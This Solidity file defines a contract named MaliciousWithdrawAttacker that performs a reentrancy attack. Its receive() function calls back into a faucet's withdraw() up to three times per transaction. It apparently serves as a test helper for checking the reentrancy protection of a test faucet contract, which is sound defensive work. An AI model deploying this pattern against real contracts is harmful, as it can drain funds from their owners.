// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IEthTestFaucet {
    function withdraw(uint256 amount) external;
}

/**
 * @title MaliciousWithdrawAttacker
 * @dev A malicious contract that attempts to perform a reentrancy attack on the withdraw() function
 * @notice This contract must be the owner of the faucet to call withdraw()
 */
contract MaliciousWithdrawAttacker is Ownable {
    IEthTestFaucet public faucet;
    uint256 public attackCount;
    uint256 public maxAttacks;
    uint256 public withdrawAmount;
    
    constructor(address _faucet) Ownable(msg.sender) {
        faucet = IEthTestFaucet(_faucet);
        maxAttacks = 3; // Try to withdraw 3 times in one transaction
    }
    
    /**
     * @dev Initiates the attack by calling withdraw on the faucet
     * @param amount The amount to withdraw
     */
    function attack(uint256 amount) external onlyOwner {
        attackCount = 0;
        withdrawAmount = amount;
        faucet.withdraw(amount);
    }
    
    /**
     * @dev Receive function that attempts to re-enter the withdraw function
     */
    receive() external payable {
        attackCount++;
        if (attackCount < maxAttacks) {
            // Attempt to re-enter withdraw()
            faucet.withdraw(withdrawAmount);
        }
    }
}
